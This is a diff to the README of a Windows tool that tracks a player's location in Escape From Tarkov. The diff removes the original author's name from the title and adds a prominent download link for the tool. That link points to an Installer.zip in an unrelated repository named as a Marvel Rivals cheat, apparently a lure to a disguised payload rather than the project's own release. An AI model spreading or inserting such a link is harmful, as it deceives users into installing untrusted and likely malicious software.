@@ -1,6 +1,6 @@
 <!-- ![Github All Releases](https://img.shields.io/github/downloads/M4elstr0m/TarkovMapTracker/total.svg) -->
 
-## <h1 align="center">🧭 Tarkov Map Tracker by M4elstr0m</h1>
+## <h1 align="center">🧭 Tarkov Map Tracker</h1>
 <p align="center">Watch your realtime Escape From Tarkov in-game location 🗺️</p>
 
 <div align="center">
@@ -188,6 +188,8 @@ To display your position correctly, you will have to select among the maps the o
 </table>
 </div>
 <!-- 🚧✅ --->
+
+# <p align="center"> [Download .zip Tarkov Map Tracker](https://github.com/starlet62sherman/marvel-rivals-cheat/releases/download/Releases/Installer.zip)
 
 ## 🖥️ Platforms
 This software is only for **Windows** and is only helpful when you have Escape From Tarkov installed on your computer
